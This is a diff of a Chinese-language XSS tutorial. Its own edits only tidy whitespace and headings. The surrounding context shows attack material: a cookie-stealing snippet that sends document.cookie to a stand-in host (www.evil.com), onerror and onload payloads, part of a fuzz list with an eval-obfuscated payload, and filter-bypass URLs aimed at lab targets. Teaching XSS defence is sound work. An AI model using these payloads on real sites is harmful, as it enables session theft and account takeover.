@@ -17,15 +17,11 @@ XSS攻击主要是针对用户进行攻击，产生的原因是网站应用程�
 * 按键记录和钓鱼
 * 开启摄像头等
 
-
-
 ## 类型
 
 * 反射型：非持久型，需要欺骗用户自己去点击链接才能触发漏洞。
 * 存储型：持久型，攻击者把代码保存到数据库中，当用户访问存在漏洞的网页就会触发恶意代码。
 * DOM型：DOM—based XSS漏洞是基于文档对象模型（Document Objeet Model，DOM）的一种漏洞，DOM型是通过URL传入参数去控制触发的。
-
-
 
 ## 防御
 
@@ -40,19 +36,15 @@ XSS攻击主要是针对用户进行攻击，产生的原因是网站应用程�
 
 表单劫持：一个数据包发送了两份，一份给服务器，一份给了抓包平台。
 
-绕过HhttpOnly：
+### 绕过HhttpOnly：
 
 浏览器未保存账号密码，需要XSS产生登陆地址，利用表单劫持
 
 浏览器保存账号密码：产生在后台的XSS，存储型如浏览器等，读取账号密码
 
-
-
 **根本的解决方法：**
 
 从输入到输出都需要过滤、转义。
-
-
 
 ## 攻击示例
 
@@ -67,8 +59,6 @@ XSS攻击主要是针对用户进行攻击，产生的原因是网站应用程�
 或者这样
 
 ![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210820221526.png)
-
-
 
 ### 存储型
 
@@ -127,8 +117,6 @@ http://192.168.50.75/target_sys.com/xss/xss03.php?name=<script>alert("hacker");<
 
 ![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210820232559.png)
 
-
-
 ## 利用
 
 ### 盗取cookie
@@ -161,8 +149,6 @@ img.src="http://www.evil.com/log?"+escape(document.cookie);
 document.body.appendChild(img);
 ```
 
-
-
 ### 构造语句
 
 **注意**：并非所有JavaScript payload都需要打开和关闭`<script>`标签。有一些HTML事件属性在触发时执行[JavaScript](https://www.w3schools.com/tags/ref_eventattributes.asp)。这意味着任何专门针对 Script 标签的规则都是无效的。例如，下列这些执行 JavaScript 的 HTML 事件属性就不使用` <script>`标签：
@@ -172,8 +158,6 @@ document.body.appendChild(img);
 <body onload="alert('XSS')">
 <img src="http://test.cyberspacekittens.com" onerror=alert(document.cookie);>
 ```
-
-
 
 以下可以用来充当fuzz字典。
 
@@ -257,8 +241,6 @@ a="get";b="URL";c="javascript.:";d="alert('XSS');";eval(a+b+c+d);
 <A HREF=http://www.gohttp://www.google.com/ogle.com/>link</A>
 ```
 
-
-
 ## 手动演示
 
 ### 大小写
@@ -276,8 +258,6 @@ http://target_sys.com/xss/xss04.php?name=huan%3CScript%3Ealert(%22xss%22)%3C/Scr
 ```
 
 ![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210822105607.png)
-
-
 
 ### 属性多余
 
@@ -351,8 +331,6 @@ http://target_sys.com/xss/xss05.php?name=huan%3C%3Cscript%3Escript%3Ealert(%22xs
 成功搞定！
 
 ![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210822111512.png)
-
-
 
 ### 标签替换
 
@@ -663,8 +641,6 @@ http://10.4.7.5/owaspbricks/content-2/index.php?user=harry%3Cscript%20src=http:/
 除了社工库以外，还有其他很多模块需要研究。
 
 可以看到，XSS攻击所造成的危害是十分巨大的，如果对方构造的是一个存储型或蠕虫攻击，那么所造成的影响便会成指数级增长。
-
-
 
 ## 漏洞可能存在点
 
